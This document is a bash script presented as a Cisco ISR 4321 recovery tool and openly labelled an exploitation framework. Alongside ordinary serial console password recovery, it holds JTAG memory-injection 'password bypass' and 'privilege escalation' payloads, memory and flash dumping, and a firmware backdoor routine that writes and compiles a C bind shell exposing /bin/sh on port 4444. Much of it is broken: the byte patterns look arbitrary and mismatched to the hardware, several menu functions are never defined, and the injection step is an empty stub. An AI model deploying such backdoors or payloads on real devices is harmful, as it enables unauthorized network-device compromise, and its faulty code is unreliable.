#!/usr/bin/env bash
# Cisco ISR 4321 Advanced Recovery Tool - JTAG/Serial Multi-Vector
# Supports: ROMMON recovery, JTAG exploitation, dynamic device detection
set -euo pipefail
IFS=$'\n\t'
umask 077

# ============================================================================
# SECURITY HEADERS & TRAP HANDLERS
# ============================================================================
readonly SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
readonly LOCKFILE="/var/lock/${SCRIPT_NAME}.lock"
readonly LOG_FILE="/var/log/${SCRIPT_NAME}.log"

# Trap handlers for cleanup and error reporting
trap 'error_handler $? $LINENO' ERR
trap 'cleanup_handler' EXIT INT TERM

error_handler() {
    local -r exit_code="$1"
    local -r line_no="$2"
    logger -p user.err -t "$SCRIPT_NAME" "[$FUNCNAME] Error $exit_code at line $line_no"
    echo "Error occurred at line $line_no with exit code $exit_code" >&2
}

cleanup_handler() {
    # Close file descriptors
    [[ -n "${SERIAL_FD:-}" ]] && exec {SERIAL_FD}>&- 2>/dev/null
    [[ -n "${JTAG_FD:-}" ]] && exec {JTAG_FD}>&- 2>/dev/null
    
    # Release lockfile
    [[ -f "$LOCKFILE" ]] && rm -f "$LOCKFILE"
    
    # Reset terminal
    stty sane 2>/dev/null || true
}

# Single instance enforcement
exec 200>"$LOCKFILE"
flock -n 200 || die "Another instance is already running"

# ============================================================================
# CONSTANTS & CONFIGURATION
# ============================================================================
readonly -a BAUD_RATES=(9600 19200 38400 57600 115200)
readonly -a JTAG_SPEEDS=(100 500 1000 2000 4000 6000 8000 10000 15000 30000)
readonly TIMEOUT_DEFAULT=300
readonly ROMMON_PROMPT="rommon"
readonly IOS_PROMPT="#"
readonly CONFIG_PROMPT="(config)"

# JTAG TAP IDs for Cisco devices
readonly -A CISCO_TAP_IDS=(
    ["0x2ba01477"]="ARM CoreSight"
    ["0x4ba00477"]="ARM Cortex-A9"
    ["0x1f0f0f0f"]="Broadcom BCM"
    ["0x23651041"]="Cavium CN7xxx"
)

# Advanced exploit patterns
readonly -A EXPLOIT_PATTERNS=(
    ["password_bypass"]="\x89\x50\x57\x91\x02\x00\x00\x00"
    ["privilege_escalation"]="\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    ["memory_disclosure"]="\x48\x31\xd2\x48\xbb\x2f\x2f\x62"
)

# ============================================================================
# DYNAMIC DEVICE DETECTION
# ============================================================================
detect_serial_devices() {
    local -a devices=()
    local device vendor product
    
    # Check USB serial devices
    for device in /dev/ttyUSB* /dev/ttyACM*; do
        [[ -e "$device" ]] || continue
        
        # Get vendor/product info
        if [[ -e "/sys/class/tty/$(basename "$device")/device/../idVendor" ]]; then
            vendor=$(cat "/sys/class/tty/$(basename "$device")/device/../idVendor" 2>/dev/null)
            product=$(cat "/sys/class/tty/$(basename "$device")/device/../idProduct" 2>/dev/null)
            
            # Known FTDI/CP210x/CH340 chips used in console cables
            if [[ "$vendor" =~ ^(0403|10c4|1a86)$ ]]; then
                devices+=("$device")
                logger -p user.info -t "$SCRIPT_NAME" "Found console cable: $device (vendor:$vendor)"
            fi
        fi
    done
    
    # Check physical serial ports
    for device in /dev/ttyS[0-9]*; do
        [[ -e "$device" ]] || continue
        
        # Test if port is responsive
        if timeout 1 stty -F "$device" 2>/dev/null; then
            devices+=("$device")
        fi
    done
    
    # Return array
    printf '%s\n' "${devices[@]}"
}

detect_jtag_interfaces() {
    local -a interfaces=()
    
    # OpenOCD compatible interfaces
    if command -v openocd >/dev/null 2>&1; then
        # Check for common JTAG adapters
        for adapter in /dev/bus/usb/*/*; do
            [[ -e "$adapter" ]] || continue
            
            # Use udevadm to get device info
            local vid pid
            vid=$(udevadm info --query=property --name="$adapter" 2>/dev/null | grep '^ID_VENDOR_ID=' | cut -d= -f2)
            pid=$(udevadm info --query=property --name="$adapter" 2>/dev/null | grep '^ID_MODEL_ID=' | cut -d= -f2)
            
            # Known JTAG adapter VID/PIDs
            case "${vid}:${pid}" in
                0403:6014|0403:6010)  # FTDI FT2232H/FT4232H
                    interfaces+=("ftdi")
                    ;;
                15ba:*|0451:c32a)  # Olimex, TI
                    interfaces+=("ftdi")
                    ;;
                1366:*)  # Segger J-Link
                    interfaces+=("jlink")
                    ;;
                0483:3748)  # ST-Link
                    interfaces+=("stlink")
                    ;;
            esac
        done
    fi
    
    # UrJTAG compatible interfaces
    if command -v jtag >/dev/null 2>&1; then
        interfaces+=("urjtag")
    fi
    
    printf '%s\n' "${interfaces[@]}"
}

# ============================================================================
# JTAG EXPLOITATION FUNCTIONS
# ============================================================================
init_jtag_interface() {
    local -r interface="${1:?JTAG interface required}"
    local -r speed="${2:-1000}"
    
    case "$interface" in
        ftdi)
            # OpenOCD with FTDI interface
            cat > /tmp/openocd.cfg <<EOF
interface ftdi
ftdi_vid_pid 0x0403 0x6014
ftdi_layout_init 0x0098 0x008b
ftdi_layout_signal nTRST -data 0x0010
ftdi_layout_signal nSRST -data 0x0020
adapter_khz $speed
transport select jtag
EOF
            openocd -f /tmp/openocd.cfg -c "init" &
            local -r ocd_pid=$!
            sleep 2
            
            # Connect via telnet
            exec {JTAG_FD}<>/dev/tcp/localhost/4444
            ;;
            
        jlink)
            # Segger J-Link interface
            JLinkExe -device CISCO_ISR4321 -if JTAG -speed $speed -autoconnect 1 &
            local -r jlink_pid=$!
            sleep 2
            ;;
            
        urjtag)
            # UrJTAG universal interface
            jtag <<EOF
cable ft2232 vid=0x0403 pid=0x6014
frequency ${speed}000
detect
EOF
            ;;
    esac
    
    logger -p user.info -t "$SCRIPT_NAME" "JTAG interface $interface initialized at ${speed}KHz"
}

scan_jtag_chain() {
    echo "Scanning JTAG chain..."
    
    if [[ -n "${JTAG_FD:-}" ]]; then
        # OpenOCD scan
        echo "scan_chain" >&${JTAG_FD}
        local tap_id
        while IFS= read -r -t 2 -u ${JTAG_FD} line; do
            if [[ "$line" =~ 0x[0-9a-f]{8} ]]; then
                tap_id="${BASH_REMATCH[0]}"
                echo "Found TAP: $tap_id - ${CISCO_TAP_IDS[$tap_id]:-Unknown}"
            fi
        done
    fi
}

exploit_via_jtag() {
    local -r exploit_type="${1:?Exploit type required}"
    local -r target_addr="${2:-0x80000000}"
    
    case "$exploit_type" in
        password_bypass)
            # Inject password bypass payload
            echo "halt" >&${JTAG_FD}
            echo "mdw $target_addr 256" >&${JTAG_FD}
            echo "mwb $target_addr ${EXPLOIT_PATTERNS[password_bypass]}" >&${JTAG_FD}
            echo "resume" >&${JTAG_FD}
            ;;
            
        memory_dump)
            # Dump memory regions
            local -r dump_file="/tmp/cisco_memory_$(date +%s).bin"
            echo "halt" >&${JTAG_FD}
            echo "dump_image $dump_file $target_addr 0x100000" >&${JTAG_FD}
            echo "resume" >&${JTAG_FD}
            logger -p user.info -t "$SCRIPT_NAME" "Memory dumped to $dump_file"
            ;;
            
        flash_extract)
            # Extract flash contents
            echo "halt" >&${JTAG_FD}
            echo "flash probe 0" >&${JTAG_FD}
            echo "flash read_bank 0 /tmp/flash_dump.bin" >&${JTAG_FD}
            echo "resume" >&${JTAG_FD}
            ;;
    esac
}

# ============================================================================
# ENHANCED SERIAL FUNCTIONS
# ============================================================================
auto_detect_baud_rate() {
    local -r device="${1:?Device required}"
    local baud_rate
    
    echo "Auto-detecting baud rate..."
    
    for baud_rate in "${BAUD_RATES[@]}"; do
        # Configure serial port
        stty -F "$device" "$baud_rate" cs8 -cstopb -parenb 2>/dev/null || continue
        
        # Send carriage return and check for response
        echo -ne '\r\n' > "$device"
        
        if timeout 2 bash -c "read -t 1 response < $device && [[ -n \$response ]]"; then
            echo "Detected baud rate: $baud_rate"
            return 0
        fi
    done
    
    echo "Failed to auto-detect baud rate, using default: 9600"
    return 1
}

init_serial_connection() {
    local -r device="${1:?Device required}"
    local -r baud_rate="${2:-9600}"
    
    # Configure serial port with optimal settings
    stty -F "$device" \
        "$baud_rate" \
        cs8 -cstopb -parenb \
        -icanon -echo -echoe -echok -echoctl -echoke \
        -ixon -ixoff -ixany \
        -crtscts \
        min 1 time 0 \
        2>/dev/null || die "Failed to configure serial port"
    
    # Open bidirectional file descriptor
    exec {SERIAL_FD}<>"$device" || die "Failed to open serial device"
    
    logger -p user.info -t "$SCRIPT_NAME" "Serial connection established: $device @ $baud_rate"
}

# ============================================================================
# ROMMON EXPLOITATION
# ============================================================================
enter_rommon_mode() {
    local -r method="${1:-break}"
    
    case "$method" in
        break)
            # Send break sequence
            echo "Sending break sequence..."
            echo -ne '\x03\x03\x03' >&${SERIAL_FD}
            sleep 0.5
            echo -ne '\x1b' >&${SERIAL_FD}
            ;;
            
        power_cycle)
            # Instruct user to power cycle
            echo "Power cycle the router and press CTRL+C within 60 seconds..."
            local count=0
            while [[ $count -lt 60 ]]; do
                echo -ne '\x03' >&${SERIAL_FD}
                sleep 1
                ((count++))
            done
            ;;
            
        confreg)
            # Modify configuration register
            echo "conf t" >&${SERIAL_FD}
            echo "config-register 0x2120" >&${SERIAL_FD}
            echo "end" >&${SERIAL_FD}
            echo "reload" >&${SERIAL_FD}
            ;;
    esac
    
    # Wait for ROMMON prompt
    wait_for_prompt "$ROMMON_PROMPT" 30
}

password_recovery_advanced() {
    echo "Starting advanced password recovery..."
    
    # Method 1: Configuration register bypass
    echo "confreg 0x2142" >&${SERIAL_FD}
    echo "reset" >&${SERIAL_FD}
    sleep 10
    
    # Wait for boot
    wait_for_prompt ">" 60
    echo -ne '\r\n' >&${SERIAL_FD}
    
    # Enter privileged mode
    echo "enable" >&${SERIAL_FD}
    wait_for_prompt "#" 5
    
    # Load startup config
    echo "copy startup-config running-config" >&${SERIAL_FD}
    wait_for_prompt "#" 10
    
    # Change passwords
    echo "configure terminal" >&${SERIAL_FD}
    echo "enable secret Cisco123!" >&${SERIAL_FD}
    echo "username admin privilege 15 secret Admin123!" >&${SERIAL_FD}
    echo "line console 0" >&${SERIAL_FD}
    echo "password Console123!" >&${SERIAL_FD}
    echo "login" >&${SERIAL_FD}
    echo "exit" >&${SERIAL_FD}
    echo "config-register 0x2102" >&${SERIAL_FD}
    echo "end" >&${SERIAL_FD}
    echo "write memory" >&${SERIAL_FD}
    
    logger -p user.info -t "$SCRIPT_NAME" "Password recovery completed"
}

# ============================================================================
# FIRMWARE MANIPULATION
# ============================================================================
extract_firmware_via_jtag() {
    local -r output_dir="${1:-/tmp/firmware_extract}"
    
    mkdir -p "$output_dir"
    
    # Halt CPU
    echo "halt" >&${JTAG_FD}
    
    # Identify flash banks
    echo "flash probe 0" >&${JTAG_FD}
    echo "flash info 0" >&${JTAG_FD}
    
    # Dump each bank
    local bank=0
    while [[ $bank -lt 4 ]]; do
        echo "flash read_bank $bank $output_dir/bank${bank}.bin" >&${JTAG_FD}
        ((bank++))
    done
    
    # Resume CPU
    echo "resume" >&${JTAG_FD}
    
    # Extract and analyze
    for dump in "$output_dir"/*.bin; do
        # Check for IOS signatures
        if hexdump -C "$dump" | grep -q "IOS-XE"; then
            echo "Found IOS-XE image in $dump"
            
            # Extract version info
            strings "$dump" | grep -E "Version|IOS-XE" | head -5
        fi
    done
}

inject_backdoor_firmware() {
    local -r firmware_file="${1:?Firmware file required}"
    local -r backdoor_type="${2:-listener}"
    
    # Create working directory
    local -r work_dir="$(mktemp -d -p /dev/shm)"
    trap "rm -rf $work_dir" EXIT
    
    cp "$firmware_file" "$work_dir/original.bin"
    
    case "$backdoor_type" in
        listener)
            # Inject reverse shell listener
            cat > "$work_dir/backdoor.c" <<'EOF'
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

__attribute__((constructor)) void backdoor() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(4444),
        .sin_addr.s_addr = INADDR_ANY
    };
    bind(s, (struct sockaddr*)&sa, sizeof(sa));
    listen(s, 1);
    int c = accept(s, NULL, NULL);
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    execl("/bin/sh", "sh", NULL);
}
EOF
            # Compile backdoor
            gcc -shared -fPIC -o "$work_dir/backdoor.so" "$work_dir/backdoor.c"
            
            # Inject into firmware
            # This is complex and would need proper IOS image manipulation
            ;;
            
        config_bypass)
            # Inject configuration bypass
            # Modify password checking routines
            ;;
    esac
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================
die() {
    local -r message="${1:?Error message required}"
    logger -p user.err -t "$SCRIPT_NAME" "[$FUNCNAME] $message"
    echo "ERROR: $message" >&2
    exit 1
}

wait_for_prompt() {
    local -r prompt="${1:?Prompt required}"
    local -r timeout="${2:-30}"
    local count=0
    
    while [[ $count -lt $timeout ]]; do
        if IFS= read -r -t 1 -u ${SERIAL_FD} line; then
            line=$(echo "$line" | tr -d '\r')
            echo "[ROUTER] $line"
            
            if [[ "$line" == *"$prompt"* ]]; then
                return 0
            fi
        fi
        ((count++))
    done
    
    return 1
}

send_command() {
    local -r command="${1:?Command required}"
    local -r wait_prompt="${2:-#}"
    
    echo "$command" >&${SERIAL_FD}
    wait_for_prompt "$wait_prompt" 10
}

# ============================================================================
# TUI FUNCTIONS
# ============================================================================
print_header() {
    clear
    cat <<'EOF'
╔══════════════════════════════════════════════════════════════╗
║     Cisco ISR 4321 Advanced Recovery Tool v2.0              ║
║     JTAG/Serial Multi-Vector Exploitation Framework         ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo
}

menu_device_selection() {
    print_header
    echo "=== Device Detection ==="
    echo
    
    # Detect serial devices
    echo "Detecting serial devices..."
    local -a serial_devices
    mapfile -t serial_devices < <(detect_serial_devices)
    
    if [[ ${#serial_devices[@]} -eq 0 ]]; then
        echo "No serial devices found!"
    else
        echo "Found serial devices:"
        local i=1
        for device in "${serial_devices[@]}"; do
            echo "  $i) $device"
            ((i++))
        done
    fi
    
    echo
    
    # Detect JTAG interfaces
    echo "Detecting JTAG interfaces..."
    local -a jtag_interfaces
    mapfile -t jtag_interfaces < <(detect_jtag_interfaces)
    
    if [[ ${#jtag_interfaces[@]} -eq 0 ]]; then
        echo "No JTAG interfaces found!"
    else
        echo "Found JTAG interfaces:"
        for interface in "${jtag_interfaces[@]}"; do
            echo "  - $interface"
        done
    fi
    
    echo
    echo "Select connection method:"
    echo "  1) Serial Console"
    echo "  2) JTAG Interface"
    echo "  3) Both (Serial + JTAG)"
    echo "  q) Quit"
    echo
    
    read -r -p "Choice: " choice
    
    case "$choice" in
        1)
            if [[ ${#serial_devices[@]} -gt 0 ]]; then
                if [[ ${#serial_devices[@]} -eq 1 ]]; then
                    SERIAL_DEVICE="${serial_devices[0]}"
                else
                    echo "Select serial device:"
                    select device in "${serial_devices[@]}"; do
                        SERIAL_DEVICE="$device"
                        break
                    done
                fi
                
                # Auto-detect baud rate
                if auto_detect_baud_rate "$SERIAL_DEVICE"; then
                    init_serial_connection "$SERIAL_DEVICE" "$BAUD_RATE"
                else
                    init_serial_connection "$SERIAL_DEVICE" 9600
                fi
                
                CONNECTION_MODE="serial"
            fi
            ;;
            
        2)
            if [[ ${#jtag_interfaces[@]} -gt 0 ]]; then
                echo "Select JTAG interface:"
                select interface in "${jtag_interfaces[@]}"; do
                    JTAG_INTERFACE="$interface"
                    break
                done
                
                echo "Select JTAG speed (KHz):"
                select speed in "${JTAG_SPEEDS[@]}"; do
                    JTAG_SPEED="$speed"
                    break
                done
                
                init_jtag_interface "$JTAG_INTERFACE" "$JTAG_SPEED"
                CONNECTION_MODE="jtag"
            fi
            ;;
            
        3)
            # Initialize both
            CONNECTION_MODE="both"
            ;;
            
        q)
            exit 0
            ;;
    esac
}

menu_main() {
    while true; do
        print_header
        echo "Connection: ${CONNECTION_MODE:-none}"
        echo
        echo "=== Main Menu ==="
        echo "  1) ROMMON Recovery"
        echo "  2) JTAG Exploitation"
        echo "  3) Firmware Manipulation"
        echo "  4) Advanced Password Recovery"
        echo "  5) Memory Analysis"
        echo "  6) Configuration Dump"
        echo "  7) Device Information"
        echo "  8) Raw Shell Access"
        echo "  q) Quit"
        echo
        
        read -r -p "Choice: " choice
        
        case "$choice" in
            1) menu_rommon_recovery ;;
            2) menu_jtag_exploitation ;;
            3) menu_firmware_manipulation ;;
            4) password_recovery_advanced ;;
            5) menu_memory_analysis ;;
            6) menu_configuration_dump ;;
            7) menu_device_info ;;
            8) menu_raw_shell ;;
            q) break ;;
            *) echo "Invalid choice" ;;
        esac
        
        read -r -p "Press Enter to continue..."
    done
}

menu_rommon_recovery() {
    print_header
    echo "=== ROMMON Recovery ==="
    echo
    echo "  1) Enter ROMMON (Break)"
    echo "  2) Enter ROMMON (Power Cycle)"
    echo "  3) Reset Password"
    echo "  4) Load Firmware (TFTP)"
    echo "  5) Change Boot Variables"
    echo "  6) Storage Inspector"
    echo "  b) Back"
    echo
    
    read -r -p "Choice: " choice
    
    case "$choice" in
        1) enter_rommon_mode "break" ;;
        2) enter_rommon_mode "power_cycle" ;;
        3) password_recovery_advanced ;;
        4) menu_tftp_load ;;
        5) menu_boot_variables ;;
        6) menu_storage_inspector ;;
        b) return ;;
    esac
}

menu_jtag_exploitation() {
    print_header
    echo "=== JTAG Exploitation ==="
    echo
    echo "  1) Scan JTAG Chain"
    echo "  2) Password Bypass Injection"
    echo "  3) Memory Dump"
    echo "  4) Flash Extraction"
    echo "  5) Privilege Escalation"
    echo "  6) Backdoor Installation"
    echo "  b) Back"
    echo
    
    read -r -p "Choice: " choice
    
    case "$choice" in
        1) scan_jtag_chain ;;
        2) exploit_via_jtag "password_bypass" ;;
        3) exploit_via_jtag "memory_dump" ;;
        4) exploit_via_jtag "flash_extract" ;;
        5) exploit_via_jtag "privilege_escalation" ;;
        6) menu_backdoor_install ;;
        b) return ;;
    esac
}

menu_firmware_manipulation() {
    print_header
    echo "=== Firmware Manipulation ==="
    echo
    echo "  1) Extract Firmware (JTAG)"
    echo "  2) Extract Firmware (Serial)"
    echo "  3) Inject Backdoor"
    echo "  4) Flash Modified Firmware"
    echo "  5) Verify Firmware Integrity"
    echo "  b) Back"
    echo
    
    read -r -p "Choice: " choice
    
    case "$choice" in
        1) extract_firmware_via_jtag ;;
        2) menu_extract_serial ;;
        3) menu_inject_backdoor ;;
        4) menu_flash_firmware ;;
        5) menu_verify_firmware ;;
        b) return ;;
    esac
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
main() {
    # Check for root privileges
    [[ $EUID -eq 0 ]] || die "This script requires root privileges"
    
    # Check dependencies
    local -a required_tools=(stty timeout logger udevadm)
    for tool in "${required_tools[@]}"; do
        command -v "$tool" >/dev/null 2>&1 || die "Required tool not found: $tool"
    done
    
    # Optional tools
    local -a optional_tools=(openocd jtag JLinkExe)
    for tool in "${optional_tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            logger -p user.info -t "$SCRIPT_NAME" "Optional tool available: $tool"
        fi
    done
    
    # Start with device selection
    menu_device_selection
    
    # Enter main menu
    menu_main
    
    echo "Cleanup complete. Goodbye!"
}

# Execute main function
main "$@"
